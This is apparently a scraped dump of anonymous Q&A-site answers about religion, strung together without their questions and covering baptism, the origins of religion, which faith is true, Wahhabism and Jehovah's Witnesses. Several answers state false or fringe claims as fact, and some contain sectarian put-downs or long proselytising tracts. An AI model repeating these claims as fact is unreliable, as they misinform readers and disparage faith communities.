db7df25ea31227e5641d5c32d43c3bcdaa	the jews when they went it to the temple had to use water to make them clean physically.    this was said by jesus to Nicodemus a jewish leader.  It relates to these verses  Ezekiel 36:25  Then will I sprinkle clean water upon you, and ye shall be clean: from all your filthiness, and from all your idols, will I cleanse you.   Ezekiel 36:26  A new heart also will I give you, and a new spirit will I put within you: and I will take away the stony heart out of your flesh, and I will give you a heart of flesh.   Ezekiel 36:27  And I will put my spirit within you, and cause you to walk in my statutes, and ye shall keep my judgments, and do them.       God said he would clean them with water and a new spirit.  The jews had to prepare to enter the temple mentally and physically so as not to become unclean.    They used water for the physical cleaning and they had to keep their mind from making them unclean.|`|97oxJ0B8aa	I have a few possibilities in mind, but to the best of my understanding, we are born of water when we are born (the water breaks).  And born of the Spirit when we believe.|`|r8rykCkGaa	Since the baby in the womb is in a bag of water, then that makes for being born of water, while being born again is being born of the Spirit.|`|AA11220299	There are different interpretations, but in its use in John 3 it is obvious from the context that the one is a natural birth (water) and the other is a spiritual birth.|`|ZJ6Nwbv3aa	Chief says, that water that boils is only for making food, and water that boils for not making food is water of the spirits un rested.    Suggestion: Should we put what we believe in the sources box, since its left empty most of the time|`|ouXrNitMaa	That ritual was invented by the Hindus. They believed immersion in water while chanting religious themes, or being touched by a religious leader cleaned away the "impurities" of thought, and made one "new again", or as some say "born again".|`|8ubAwaGCaa	Paul goes to great lengths to compare the process of becoming spiritually alive to the process of becoming an air breather.      Being born of water means to be baptized by immersion.  As we leave the enveloping water, it serves to remind us how we began our new lives (leaving the amniotic fluid), and therefore to consider that a newness of life has begun.  The immersion also reminds us of the death, burial, and resurrection of Jesus.    John the Baptist, if you go into the Greek roots, means "John the Submerger," or John the Sinker."  He went around submerging people in water.  That's why certain spots of the Jordan River were more convenient for him, because of their "much water."      To be born of the spirit happens later, often much later.  When the Holy Ghost gives his personal witness of truth to us, and we change our lives to be more in tune with God's nature and love, then we have entered into a new kind of life, a spiritual life as opposed to a carnal life.  To this day, a "baptism by fire" is used to mean a defining moment in our lives or careers.|`|qDbbw3CTaa	To born of the spirit means increases the Light against the Dark. And that is Light is the spiritual food Jesus gave to disciples on Pentacostal day in the form of "very might wind as of cloven tongues of Fire which rested on each of the disciples.'' If everyone were using the Pentacostal Flames in meditation, we could transform the world in one generation.    Even Johh writes: 'he who is greater then me, who's sandals I am unworth to beat he shall baptize you with Fire.' act 2-11
r8rykCkGaa	Well, it will seem random to those who don't know what is going on, but when we are led by the Spirit, we will do various odd jobs to show love to those who may be outsiders or they may be part of the household of God.      ~ ~ ~ Do not be deceived, God is not mocked; for whatever a man sows, that he will also reap.  For he who sows to his flesh will of the flesh reap corruption, but he who sows to the Spirit will of the Spirit reap everlasting life.  And let us not grow weary while doing good, for in due season we shall reap if we do not lose heart.  Therefore, as we have opportunity, let us do good to all, especially to those who are of the household of faith.  Galatians 6:7-10|`|rz4AUvbaaa	Random misses the mark completely.

S4zNEAFJaa	Sometimes, the only way one can get through a tough situation is through humor. It lightens the load a bit.|`|a3j82sBpaa	Sleek is right. Laugh a bit. Then, resume working.|`|76ea3a562a33cdae910d9e4983afb205aa	When a fool pulls on a cord, and four-hundred-million people trip and fall on their face at the same time, it just naturally tickles ones brain.|`|d8zxbKduaa	Most people aren't all that affected by it yet. And those that are aren't laughing.|`|9d5ebdddeefc6a77bdd9da09ca8367e7aa	If they didn't laugh they'd cry. In my experience either one can be a reaction to stress, fatigue, loss or grief. I personally prefer to hear someone attempt a joke than to hear them lament or wail hysterically, but I have no wish to rub salt into your wounds. I recommend you simply ignore those who offend you.

59dd5008296ef156d8a7982658c3dc82aa	There is only one true religion that is from the All-Knowing Creator (and I'm guessing you know which one that is). All other religions were the creation of man.|`|AA10558458	Men came with  messages that apparently answered a need of the time and people rallied around them.  It's as simple as that. If you believe the messages, you say they were messengers of the truth. If you don't believe, then you say they were delusioned people or crooks. However, the answer to your question is that men came with messages that apparently answered a need  of the time.    Edit: The answer of worldnerverchanges fails to acknowledge that all religions have an initial messenger, sometimes followed by a serie of them.|`|nIu8zVkXaa	Religions are all started by men and the traditions they created.  Now if your talking about theological beliefs, that's a whole different story and an entirely different question.|`|434cdba191b138eb36e563b9ef737a76aa	The early humans did not understand the various happenings of nature.  They didn't why everything happened.  Birth, death, fire, volcanic eruptions, the rising and setting of the moon and the sun and the stars, earthquakes, rain, etc.  They thought that all this was magic and was being controlled by some unseen force or person.  This gave rise to fear of the unknown.  As languages came into being, these fears were vocalized or written and practices formed to appease the "unseen".  These practices then took hold and became the norm.  Rules and procedures came into being as to how the "unseen" force should be appeased.  All these became the basis of religion.  In other words religion came out of fear of the unknown.|`|LSJ8BmHVaa	People didn't understand the cause of lightning or earthquakes, etc.  So they invented explanations.  They made sacrifices or did dances to attempt to control what they couldn't control.  If problems coincidentally went away then they assumed their actions were correct.  When the problems returned they assumed they had somehow offended the gods.|`|5tMCDu8gaa	One theory that is gaining ground with the emerging connection between brain damage and religion, is the bicameral mind.    There used to be a very common flaw in the connective tissue between the 2 hemispheres of the brain that caused a sort of "double think" of the mind. This may have been the source of the "god" that "prophets" heard. Think of it like a mild case of schizophrenia.    This flaw has been gradually bred out of the human race, much like flawed tonsils are being bred out today. The result has been a very gradual receding of religion.|`|evStsOQiaa	Religions started from ancient man mistranslating the advanced scientific knowledge and powers of our "Intelligent Designer" or God.|`|USd2LAOUaa	By watching the sun, the moon and the stars and how they affected the inhabitants of the earth.....|`|dFBccLExaa	Well, it's linked with mythology- people needed a way to explain how and why things happened. And the elements and forces of nature where so awe-inspiring that many people treated them like gods... and the worship of gods to keep them happy, and your life happy became a larger and more complex practice over time... and that's more or less how religions began.|`|sW6lxVFOaa	The way most stories start.|`|Z92LPUqaaa	Abstract thinking, the ability to reason, etc.  We make concepts and believe they are a reality.

One example is I dreamed that I was watching the weather channel and they were showing all of the counties under a tornado warning.  There were a lot of them!    Well, the next day, I was watching CNN and there were a bunch of tornado warnings in the same area I dreamed about.    I have actually had a few weather related dreams come true.    It is all very strange and something I can not control or even begin to undrestand why I would have a preminition dream!    Yep, that definantlly falls in the "can't explain" category!

EBGdlo35aa	1) Is the bible still fact if the existence of god is not absolute fact?    No - that is, if I understand the question.  The bible, in whole, is factual only if God is real.  If God is not a fact, then the bible is erroneous.      2) Which to me means that the bible is telling me god and the bible and religion are beliefs not absolute fact.    I'm confused - how could the preceding sentence possibly mean anything at all like this?      3) you will see that you can know something and it not be a fact    No - the only things that you can know are facts.  A fact is something that is true regardless of what believe believe regarding the matter.  If you are cognizant of a fact, then that is something that you know.  If you are NOT cognizant of a fact but still believe it to be true, that is belief / faith.  However, you can also not be cognizant of a fact and believe that it is NOT true.  In such a case, your belief / faith is in error.    People (particularly religious people) frequently use the word "know" in an inappropriate manner.  To "know" doesn't ever mean to "believe".  Rather, it means to be "aware of".  That is quite a difference in meaning!    As for God being a fact..I *believe* that God is a fact.  I cannot prove it - but just because I cannot prove it does not mean that it is not a fact.  On the other hand, it would be wrong to say that I *know* God is a fact.  I believe it unconditionally - but I recognize that my belief *is* belief.  If I cannot prove it objectively, I cannot (with integrity) say that I *know* it to be true.    "Believing" does not shake my faith at all.  Using the word "know" sounds more forceful and more certain, but really it is NOT more certain.  "Know" merely indicates that something is objectively observable.  The word "believe" does not question the truth of something.

So anyone making the assumption that the Bible that is sitting in front of them is exactly what God wanted them to see - is out on a pretty thin limb.  All texts of the faiths of man claim to be under the hand of God, yet all of them were written by the hand of man.  Any other associations have to be a complete leap of faith - and you can make that leap, or consider the text to contain flaws of unknown quantity, or just consider it to be fiction.

Are you distressed about crimes committed in the name of religion? Do the warfare, terrorism, and corruption perpetrated by those who claim to serve God offend your sense of justice? Why does religion seem to be at the root of so many problems?    The fault lies, not with all religion, but with false religion. A widely respected religious figure, Jesus Christ, indicated that false religion produces bad works, just as a rotten tree produces worthless fruit. (Matthew 7:15-17) What fruit does false religion yield?      MEDDLES IN WAR AND POLITICS: Across Asia and beyond, says the journal Asiaweek, power-hungry leaders are cynically manipulating peoples religious sentiments for their own needs. As a result, the journal warns: The world threatens to sink into madness. A prominent religious leader in the United States declared: Youve got to kill the terrorists before the killing stops. His solution? Blow them all away in the name of the Lord. By contrast, the Bible says: If anyone makes the statement: I love God, and yet is hating his brother, he is a liar. (1 John 4:20) Jesus even said: Continue to love your enemies.

It was people like Paul who turned the teaching of Jesus into Christianity...which then evolved and pagan teaching from the Romans became an intrinsic part of the teaching...    One can see this evolution in then bible.. Where the earliest of Gospels is Mark..Jesus is protrayed very much like the Prophet descibed in the Quran...However, when ones gets to John, then the story has been 'improved' to become much more like the divine person in christianity...

How can one determine which one is correct or if, in fact, all are correct? The method by which the answer can be found is to clear away the superficial differences in the teachings of the various claimants to the ultimate truth, and identify the central object of worship to which they call, directly or indirectly. False religions all have in common one basic concept with regards to Allah. They either claim that all men are gods or that specific men were Allah or that nature is Allah or that Allah is a figment of man's imagination.  Thus, it may be stated that the basic message of false religion is that Allah may be worshipped in the form of His creation. False religion invites man to the worship of creation by calling the creation or some aspect of it God. For example, prophet Jesus invited his followers to worship Allah but those who claim to be his followers today call people to worship Jesus, claiming that he was Allah!  Buddha was a reformer who introduced a number of humanistic principles to the religion of India. He did not claim to be God nor did he suggest to his followers that he be an object of worship. Yet, today most Buddhists who are to be found outside of India have taken him to be God and prostrate to idols made in their perception of his likeness.   By using the principle of identifying the object of worship, false religion becomes very obvious and the contrived nature of their origin clear. As God said in the Our'aan:  " That which you worship besides Him are only names you and your forefathers have invented for which Allah has sent down no authority: The command belongs only to Allah:  He has commanded that you only worship Him; that is the right religion, but most men do not understand ".  (Soorah Yoosuf 12:40)  It may be argued that all religions teach good things so why should it matter which one we follow. The reply is that all false religions teach the greatest evil, the worship of creation. Creation-worship is the greatest sin that man can commit because it contradicts the very purpose of his creation. Man was created to worship Allah alone as Allah has explicitly stated in the the Quran:  " I have only created Jinns and men, that they may worship me "  (Soorah Zaareeyaat 51:56)  Consequently, the worship of creation, which is the essence of idolatry, is the only unforgivable sin. One who dies in this state of idolatry has sealed his fate in the next life. This is not an opinion, but a revealed fact stated by Allah in his final revelation to man.  The following criteria can best serve as a gauge to find out the authenticity of the last revelation (the Quran) as words of God:  1. Rational Teachings: Since our Creator bestowed reason and intellect upon us, it is our duty to use it to distinguish the TRUTH from falsehood. True, undistorted revelation from God must be rational and can be reasoned out by all unbiased minds.   2. Perfection: Since our Creator is all perfect, His revelation must be perfect and accurate, free from mistakes, omissions, interpolations and multiplicity of versions. It should be free from contradictions in its narration.   3. No Myths or Superstitions: True revelation is free from myths or superstitions that degrade the dignity of our Creator or man himself.   4. Scientific: Since our Creator is the Creator of all knowledge, true revelation is scientific and can withstand the challenge of science at all times.   5. Factual Prophecy: Our Creator is the Knower of the past, present and future. Thus His prophecies in His revelation will be fulfilled as prophesied.   6. Inimitable By Man: True revelation is infallible and cannot be imitated by man. God's true revelation is a Living miracle, an open book challenging all mankind to see and prove for themselves its authenticity or veracity.  read these books:  1- Dr. Maurice Bucaille is a french scientist converted to Islam and write this book  "The Bible,The Qur'an & Science" it is amazing book you can download it here http://www.ef7am.com/Files/Books/En/The_...  2-  Dr. Gary Miller is a scientist also converted to islam he wrote this book  "Amazing Quran" you can download it here   http://www.ef7am.com/Files/Books/En/Amaz...  3-  Dr. zakir Naik  wrote this fantastic book it show you the truth   "Concept of GOD in major religions" you can download it here  http://www.ef7am.com/Files/Books/En/GOD_...  http://www.islamreligion.com/ provide live help (online) by chat you can ask any question you want about Islam|`|AA10242926	Let the God who answers with fire be the real God.|`|tNQPY6QJaa	Christianity|`|IhpLJtW9aa	do that "eenie meenie miny moe" thing|`|5xiAzqXVaa	The religion you follow is the right one.

One tells of a place where everything is right, one tells if you kill lots of people you will be in a heaven with 17 virgins for your pleasure.

Muslims acknowledge His existence but accept Him as only a great prophet, believing as Jews that the Messiah has yet to come the first time.     My response would be, "If Jesus was nothing more than a great prophet, then He was a liar; because Jesus said He is the Son of God. A liar cannot be a great prophet truth and, certainly would not be the son of God who cannot lie."      I know that Christ was and is not a liar. As far as which Christian religion would be correct, I can say only as the Holy Spirit has directed me: ONLY THE BIBLE, for man's religions teach man's ways instead of God's ways. In fact, God states clearly that their way is the way of destruction.     The best example of lies coming from the various denominational pulpits, and I guarantee there are many, is to study the 4th Commandment (see Exodus c.20 & Deuteronomy c.5, then follow with Hebrews c.4); it is the most blatant, glaring lie taught in Corporate Christendom. If a Christian denomination(s) practices and observes in opposition to the 4th Commandment, then it is not of God and Christ.     I pray this helps to answer your question.

Much love in Christ,  Sister Speaker BonnieQ   TSaS|`|JM56jNJBaa	Each person is born in a circumstance which is not of his own choosing. The religion of his family or the ideology of the state is thrust upon him from the very beginning of his existence in this world. By the time he reaches his teens, he is usually fully brain-washed into believing that the beliefs of his particular society are the correct beliefs that everyone should have. However, when some people mature and are exposed to other belief-systems, they begin to question the validity of their own beliefs. The seekers of truth often reach a point of confusion upon realizing that each and every religion, sect, ideology and philosophy claims to be the one and only correct way for man. Indeed they all encourage people to good. So, which one is right? They cannot all be right since each claims all others to be wrong. Then how does the seeker of truth choose the right way?     God gave us all minds and intellects to enable us to make this crucial decision. It is the most important decision in the life of a human being. Upon it depends his future. Consequently, each and every one of us must examine dispassionately the evidence presented and choose what appears to be right until further evidence arises.     Like every other religion or philosophy, Islam also claims to be the one and only true way to God. In this respect it is no different from other systems. This booklet intends to provide some evidence for the validity of that claim. However, it must always be kept in mind that one can only determine the true path by putting aside emotions and prejudices, which often blind us to reality. Then, and only then, will we be able to use our God-given intelligence and make a rational and correct decision.     There are several arguments which may be advanced to support Islam's claim to be the true religion of God. The following are only three of the most obvious. The first argument is based on the Divine origin of the names of the religion and the comprehensiveness of its meaning. The second deals with the unique and uncomplicated teachings concerning the relationship between God, man, and creation. The third argument derives from the fact that Islam is universally attainable by all men at all times. These are the three basic components of what logic and reason dictate necessary for a religion to be considered the true religion of God. The following pages will develop these concepts in some detail.           The Religion's Name     The first thing that one should know and clearly understand about Islam is what the word "Islam" itself means. The Arabic word "Islam" means the submission or surrender of one's will to the only true God, known in Arabic as "Allah". One who submits his will to God is termed in Arabic a "Muslim". The religion of Islam is not named after a person or people, nor was it decided by a later generation of man, as in the case of Christianity which was named after Jesus Christ (p), Buddhism after Gautama Buddha, Confucianism after Confucius, Marxism after Karl Marx, Judaism after the tribe of Judah, and Hinduism after the Hindus. Islam (submission to the will of God) is the religion which was given to Adam (p), the first man and the first prophet of God, and it was the religion of all the prophets sent by Allah to mankind. Further, its name was chosen by God Himself and clearly mentioned in the final scripture which He revealed to man. In the final revelation, called the Qur'an in Arabic, Allah states the following:     "This day have I perfected your religion for you, completed My favour upon you, and I have chosen for you Islam as you religion." (Qur'an 5:3)   "If anyone desires a religion other than Islam (submission to God), never will it be accepted of him." (Qur'an 3:85)     Hence, Islam does not claim to be a new religion brought by Prophet Muhammad (p) into Arabia in the seventh century, but rather to be a re-expression in its final form of the true religion of Almighty God, Allah, as it was originally revealed to Adam (p) and subsequent prophets.     At this point we might comment briefly on two other religions that claim to be the true path. Nowhere in the Bible will you find God revealing to Prophet Moses' (p) people or their descendants that their religion is called Judaism, or to the followers of Christ (p) that their religion is called Christianity. In other words, the names "Judaism" and "Christianity" had no divine origin or approval. It was not until long after his departure that the name "Christianity" was given to Jesus' (p) religion.     What, then, was Jesus' (p) religion in actual fact, as distinct from its name? His religion was reflected in his teachings, which he urged his followers to accept as guiding principles in their relationship with God. In Islam, Jesus (p) is a prophet sent by Allah and his Arabic name is Eesa. Like the prophets before him, he called upon the people to surrender their will to the will of God (which is what Islam stands for). For example, in the New Tes|`|Rr1HwEibaa	you want short or CONVINCED answer     short answer is Islam     CONVINCED answer    join my group about that question     http://groups.yahoo.com/group/Truthrevea...    or visit my site     http://www.geocities.com/truth_forever21    p.s    How can we be sure about the validity of many of the religions of today?   The message of Islam is simply believing in One True Living Undivided GOD Almighty, and not taking any partners such as other people (like Jesus and Mary), or idols with Him.   As Allah Almighty said in the Noble Quran:   "Say: 'O People of the Book (i.e., Jews and Christians)!   Come to common terms as between us and you:  That we worship none but Allah; that we associate no partners with Him; that we erect not, from among ourselves, Lords and patrons other than Allah.'  If then they turn back, say ye: 'Bear witness that we (at least) are Muslims (bowing to Allah's Will).'  (The Noble Quran, 3:64)"  Even though this Noble Verse is talking directly to Jews and Christians, but it is definitely applicable to all of Mankind.  This Noble Verse summarizes the whole point of Islam.  Allah Almighty created all of Mankind to Worship Him, Glorify Him and Praise Him alone without partners.  If an individual, whether he is a Muslim or non-Muslim does that then he/she will please the Almighty GOD.  As to believing in the current religion of Islam, Islam comes naturally and miraculously to the person.|`|LjsRfaskaa	They are both incorrect because our reality is really just an illusion created by our inadequate senses.

AA12279768	I just want to note that many of the Rawaafidh here are just straight up lying.     Yes the Saudi Shee'ah dress like the Saudi Sunnis. Because they are Saudis themselves.     And many of them work in Saudia and say that they are Shee'ah. They pray outside of the Jamaa'ah in the work place and none of them lie to say they are sunni.     I know many Rawaafidh here who work and some hold positions in the Ministries without saying they are sunni. There are even Rawaafidh in the Navy too (in the east)    Unlike many of these liars here, these Rawaafidh dont lie about them being Shee'ah in order to get jobs.     There are also (sadly) shee'ah places of worship constructed like Masaajid in places like gateef.     "My dad did this" "my uncle did that"    Just stop lying.

The term "Wahhabi" is a slanderous term, used to attack Muslims who believe in following the Noble Qur'an and the Sunnah of Prophet Muhammad, peace be upon him, with the same interpretation as the Companions of the Prophet, peace be upon him, and the scholars throughout Islamic history who also followed this way. For more information, see the book's website at http://www.thewahhabimyth.com/ , inshaa-Allaah the read will be quite beneficial and insightful.    ----  ABRIDGED EXCERPT from "The Wahabi Myth"    What is a Salafi and What is Salafism?    The reader will notice that the word "Wahhabi" is always indented with quotation marks here at http://www.theWahhabiMyth.com. Those who are labeled with this word do not themselves use this term, as it is used as a means of belittlement. The reasons for the rejection of this term are clearly outlined throughout this book. The correct way of referring to them is by terming them "Salafis", as they are those who adhere to the way of the "Salaf" - the Prophet Muhammad (may Allah raise his rank and grant him peace) and his companions.    Following the way of the Salaf is the way which has been legislated in the Quran and Sunnah, the very sources of Islam. The Prophet (may Allah raise his rank and grant him peace) said to his daughter Fatimah: "Indeed, I am for you a blessed Salaf." (1)    When asked about which was the correct and acceptable way of understanding Islam, the Prophet (may Allah raise his rank and grant him peace) replied by saying: "That which I and my companions are upon." (2)    Similarly, Allah says in the Quran that He is pleased with the companions "and also those who follow them exactly (in faith)." (3)    As such, He said regarding the Prophet (may Allah raise his rank and grant him security) and his companions:    "So if they believe as you (i.e. the Salaf) believe, they are indeed rightly guided." (4)    All of the orthodox scholars of Islam followed the way of the Salaf in understanding religion. Early scholars such as Imam al-Awzaa'ee, who died 157 years after the Prophet's emigration to Medina, said: "Be patient upon the Sunnah, and stop where the people (i.e. where the Salaf) stopped, and say what they said, and refrain from what they refrained from, and follow the path of your righteous Salaf; for verily, sufficient for you is what was sufficient for them." (5)    Today, one of the famous Sunni schools of jurisprudence is named after a scholar named Abu Haneefah. Millions of Muslims all over the world ascribe themselves to his school of jurisprudence; those who the media would term "mainstream" Muslims. Regarding adherence to the Salafi methodology, he said, "Adhere to the narrations and way of the Salaf, and beware of newly invented matters (in religion), for all of it is innovation." (6)    The media claim that Salafis/"Wahhabis" believe that all those who do not follow their form of Islam are "heathens" (10) is a tall tale. Salafis believe that those Muslims who do not follow the understanding of the Salaf are not adhering to these and other clear texts. As such, they do not fall under the above-mentioned Quranic verse as being "rightly guided." Salafis distinguish between those who fall into religious innovation and those who fall into disbelief.    When considering the proofs which are contained within the Quran and Sunnah and the statements of all the orthodox scholars of Islam from the earliest generations to the present time, it becomes obvious that it is a great blunder for the media to refer to Salafism as being a new movement called "Wahhabism" which came about only two centuries ago during the time of Muhammad Ibn Abdul-Wahhab in Saudi Arabia.    "So after the truth, what else can there be, save error?" [Quran 10:32]  --------    ADDITIONAL NOTE:  For anyone interested in learning more, I encourage you to actually read the treatises of Shaykh Muhammad ibn Abdul-Wahhaab. Many of them are relatively short and amazingly beneficial. One would be hard-pressed to find anything from his essays calling to extremism. Rather, much of his work is simply about educating the common Muslim in the basics of Islamic Monotheism.

APjnSYKuaa	I am still reserving judgment on his policies. I voted for him based mostly on his ability as an orator. We need somebody who is an effective speaker and can sway his audience to work together. With that, even so-so policies with unity will be better than continuing to be divided. I felt any influence from Palin could only serve to divide us further. Without her in the mix, it would have been a much closer descision between Obama and McCain for me.

fEkKuGlEaa	Well, we can't follow Lot's Christian example because he wasn't Christian, he was of the family of Abraham, which makes him Jewish. And I'm not sure what source you read that called him 'kind' for doing that. He was called 'righteous' but that referred to his life before he offered up his daughters.     I had an interesting dialog with some fairly conservative Jewish friends, and they said that even in Judaism, Lot's offering up of his daughters is not approved of. At best, it could be considered tragically misguided.     You might want to post a question asking for Jewish responses to Lot's actions and see what they say, but I'd wait until Saturday night. Some don't come on here during Sabbath.    Add--I just read your addition. No one in the entire Old Testament can be considered a Christian because they lived hundreds of years before Christ. The people in the OT (or Jewish Tanakh) were almost all Jewish (i.e., Hebrew, Israelite, etc.) Christians did not come along until the New Testament. \|`|4807230affa1ab91b912bc7830a4b01baa	Read Genesis 19:14.

(Proverbs 24:9) If such do not accept reproof, they will experience disaster. (Proverbs 1:22-27) And how despicable are those who deride the poor, or their own parents. (Proverbs 17:5; 30:17) Ridiculers often refuse to listen to rebuke (Proverbs 13:1) and do not love those reproving them. (Proverbs 9:7, 8; 15:12) Nevertheless, they should be disciplined for the benefit of others. (Proverbs 9:12; 19:25, 29; 21:11) Instead of keeping company with such unholy ones, it is better to drive them away; much happier are those who refuse to sit with ungodly ridiculers. (Psalms 1:1; Proverbs 22:10)    For you know this first, that in the last days there will come ridiculers with their ridicule, proceeding according to their own desires. (2 Peter 3:3) Jude says that the desires of these ridiculers are for ungodly things. He calls them animalistic men, not having spirituality. (Jude 17-19)    You can and should rejoice in the face of ridiculers because you know you are doing God's will and it was prophecied that these lowly ones would come out of the smallest of rocks to try to offend Jehovah and you, yet you stand strong. Rejoice in the face of ridiculers, and leave them alone.    They are not worth your time.     Find the lost sheep who want to be found and draw close to Jehovah God. Share the good news of the kingdom with the good and righteous-hearted ones. Don't waste time on hatemongers and wicked ones who do not want to be helped.  -------------------|`|AA11709855	Uhm, rational arguments. lol|`|KrdOKdJcaa	The best thing you can do is engage them in an intelligent conversation, trying to keep emotions out of it.

si3eq11haa	a Jehovah's witness is someone who is very sadly deceived. they use a bible which has been altered and they do not accept what Jesus has done for them on the cross. they do not believe that Jesus is Gods Son and therefore God Himself. they believe that only a certain number of JWs will ascend to heaven and the rest will stay on this earth which they believe will be altered and made new.   the bible teaches that Jesus IS God, that by His sacrifice on the cross, whoever believes in Him, will have eternal life in heaven. that this earth will pass away and that salvation is by Grace, not works.  Jehovah's witnesses, while generally good people, are Not Christians, they sadly do not belong in the Kingdom of God. they have Not accepted Jesus as their Lord and Saviour.|`|OoAYlisQaa	they are door -to-door preachers and their refusal of military service and blood transfusions.

Under the rule of Jesus Christ and his heavenly corulers, peace and happiness will prevail in all the earth. (Psalm 37:9-11) Those in God's memory will be resurrected and will enjoy perfect health. (Acts 24:15) By their faithfulness to God, obedient mankind will be granted what our original parents losteverlasting life in human perfection on a paradise earth.Revelation 21:3, 4.    Jehovah God never fails to accomplish what he purposes to do. Through his prophet Isaiah, he declared: "Just as the pouring rain descends, and the snow, from the heavens and does not return to that place, unless it actually saturates the earth and makes it produce and sprout, and seed is actually given to the sower and bread to the eater, so my word that goes forth from my mouth will prove to be. It will not return to me without results, but it will certainly do that in which I have delighted, and it will have certain success in that for which I have sent it."Isaiah 55:10, 11.    In the Bible book of Isaiah, we get a preview of what life will be like in the Paradise earth. No inhabitant of Paradise will say, "I am sick." (Isaiah 33:24) Animals will pose no danger to man. (Isaiah 11:6-9) People will build beautiful homes and inhabit them and will plant crops and eat to satisfaction. (Isaiah 65:21-25) Moreover, God "will actually swallow up death forever, and the Sovereign Lord Jehovah will certainly wipe the tears from all faces."Isaiah 25:8.    Soon, obedient mankind will live under such blessed conditions. They "will be set free from enslavement to corruption and have the glorious freedom of the children of God." (Romans 8:21) How wonderful it will be to live forever in the promised earthly Paradise! (Luke 23:43) You can be there if you act upon accurate knowledge of the Scriptures and exercise faith in Jehovah God and Jesus Christ. And you can have confidence that it does make sense to believe in a paradise earth.|`|JLNoIXkuaa	A Jehova's witness is a follower of the watchtower society; they don't follow the true God.

This is what happens when the false religion of atheism is allowed to preach its doctrines in the universities and classrooms, and enact its beliefs from the courtrooms and senate (no separation of church from state here). It is expected that the celebrations this year for Darwin's 200th birthday will be a call to all atheists to further oppose the truth.    I doubt that the enemies of God will allow a slight cash shortage to dampen their religious fervor. This being said, God's Holy Spirit is at work, and no amount of funding can allow religious growth (nor even the gates of Hell) to prevail against the Truth.|`|GQk0UNjfaa	You have a valid point.

I think the ultimate was about 18 months ago when i decided to sell my house and move back up to the northeast...  I had been living alone in a 4 bedroom house... had everything i could have possibly wanted... a home theatre room, exercise room, tanning bed..3 tivos, 2 dvd recorders,  u name it i had it... well i had lost my high paying job,..  decided to relocate and had to pack up my house... it was the most sobering thing i had ever done in my life... going thru every room, every closet, the attic the garage etc... getting rid of all of these obnoxious, expensive, unnecessary things that  I truly wasted my money on and surrounded myself with.   I  used all these things to pacify me and make up for the real things that were wrong in my life..    As i sat there packing up 9 industrial size garbage bags of clothes( at least 20 - 30 things with tags still on them )  for the Salvation army  - I looked down and thought.  "what on earth have I been doing..."  it was a major awakening fro me...  and my life is so very different now...|`|Fy9Muy6Waa	That's why I buy books at yard sales!

Once I assume that, then the question about seeking Him naturally arises.  Does science bring me closer to God?   Since science specifically excludes God, I would say not.|`|qCd4T4o5aa	God wants us to examine both, find him in both.  He is the most intelligent being.  He created all things. Now some levels of intelligence has its  limits;  One should not cross over to another.      God in his wisdom has seperate worlds and spheres, and space in the universe.    Like there are birds and lizards two seperate species that should not be mixed.  But because we humans say we are intelligent we will try to mix them.  And see what comes of it....|`|97oxJ0B8aa	I feel this question is out of the bounds of logic (no offense intended, though I'm sure it will be taken).  You're saying it's either Scrolls or Intelligence.  But fact is in both cases we're putting some confidence in info passed down from other people.  Throw away all written scientific information today, and how far are you going to get?  Can you build a nuclear reactor based on the powers of your own empirical observation?  Or are you relying on the work of past men and women?  Scripture is much the same.  It is also given credence and believed on by the evidence supplied to the observer in present day life.|`|TinNG7k7aa	I'd think so. Waste is never good, and humanity has only improved healthcare, hygiene, diet and quality of life by using intelligence and by seeking proof by using science to prove or disprove something and to add to a body of knowledge rather than relying on dumb blind faith and ritual of ancient ignoramuses.    Under government in european countries during the middle ages, cholera, war, famine, plague, magot-riddled food, rats and fleas in the bedding, horse manure and human feces in the gutters of the dirt streets spreading disease, ill drinking water causing sickness, lack of sewage, these were all under a christian-influenced government.|`|QAwwmDuDaa	either has it's complications,what we perceive we can believe,true don't you think.|`|AA11220299	No, there is a place for both. In the natural realm science, properly used, is fine, but in the spiritual realm science is virtually useless and we must use the faith that God gives us to understand.|`|Tledw3eAaa	I think we're expected to use our brains in all circumstances, including both when we read something as well as in the area of science. When we become selective in what we allow our brain to comprehend, I'd say at that point our intelligence might as well be useless.

People are not cars.  Cars are objects, so yes, if they fail to perform what they were created for, we get rid of them.    People are not objects.  You don't simply "get rid of it" if they don't follow your expectations.     When a parent drowns their kid in bathwater because the child doesn't perform how they are expected to perform, we call them crazy or evil.  So why is God not only allowed to act that way, but expected to?  Why isn't God considered crazy or evil for doing the very same things?|`|RhPNV1ohaa	That is a very important and pivotal question. Do you understand the purpose of the car? Do you understand how it is created in our image? Look at the things we share with the car. Water cooled, Temperature, Electrical system, Diagnostic system, Consumption system, Elimination system, Air breathing, Carbon dioxide exhausting. The meaning and purpose of the car is directly tied to it's creator. Without us it would not exist. Its' existence is directly dependent upon us. It is designed to serve us and if it fails it purpose well its' end is in sight. Our claims over the car are the same as God's claim over us. So if we would have meaning and purpose to life we must find out God's plan for our lives rather than following our own way. When we find His way life will spring forth in new meaning and will contain a greater value and fascination. Blessings on you.|`|WbJPQM1naa	My personal experience of healing and life in abundance. It is HIS promises made manifest in my life!|`|GC3qn1Aeaa	To a degree you can, it's called theology.  The problem is that Biblical things are concerned with revelation, which is the act of God "revealing" himself, making himself known, apparent, or visible in some way.  This is the whole essence of the Bible, that God revealed himself at first to the Jews, as written in the Old Testament, and then through his son Jesus, as testified in the New.    A testament is a will, or legal deposition.  This is what the Bible is claiming to be.  Asking it to justify itself by other proofs or arguments, is like asking a witness to give some proof for his testimony.  It is enough in any court of law for the witness to simply state his words under oath.  The burden of proof is left up to the lawyers.  So to in all things theological.    Yours in Christ, Nick|`|97oxJ0B8aa	Yeah, I've seen angels and demons.  And I have a conscience too.  And anytime I try to test any of the Bible's claims in real life they are proven true.

rz4AUvbaaa	Man never fell, but a mist came into "view" and is believed right now.  The mist never touches God's creation, but we view everything as though it has power to recreate perfection in an imperfect state called earth.|`|15b68e83c3ef9d01d0153600c96e7fe3aa	I really don't care what was written in a book some several thousand years ago about the 'fall', no matter if it comes from a Christian, Muslim, Jewish or other religious retelling of the story because, chances are, some old fart rewrote and revised the real world of God to fit his specific belief system.    You are I are not Adam. You and I are not Eve. None of us are born being pre-comdemned for the acts of the first humans. The only 'original' sin is in believing that Eve and Adam condemned us to misery for their acts. No loving God, no loving Father, would punish hundreds of generations of His children simply because of the failings of His first-born.    I believe we are all born with a clean slate and are judged accordingly by our actions, our intent and the circumstances under which the choices we make are determined. A crack-house born and raised baby surly can't be judged growing up the same way a child is who is raised in a loving, nurturing family.     If God is at all just then we will be judged not by an some so-called original sin or fall from grace pre-dumped on us, or by circumstances forced on us at birth or by an unloving environment that abuses us as children.     And I refuse to believe that one religion has the moral right to claim that they, and only 